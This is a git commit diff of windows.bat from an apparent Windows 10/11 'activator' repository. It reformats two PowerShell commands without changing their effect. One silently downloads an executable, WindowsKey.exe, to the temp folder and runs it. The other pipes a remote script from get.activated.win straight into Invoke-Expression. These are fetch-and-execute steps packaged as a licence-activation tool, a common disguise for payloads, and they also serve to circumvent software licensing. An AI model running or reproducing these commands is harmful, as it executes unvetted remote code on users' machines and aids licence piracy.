247e8dccfc275bb1f6eb39773353e6c89a93d8d4
betamod9 <164927681+betamod9@users.noreply.github.com>
2025-01-10 03:35:34 +0200

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,9 +1,13 @@
 @echo off
+
+
 set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
 set "url2=https://get.activated.win"
 
 
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
+powershell -Command ^
+    "$ProgressPreference = 'SilentlyContinue'; Start-Sleep -Seconds 5; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
 
 
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
+powershell -Command ^
+    "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
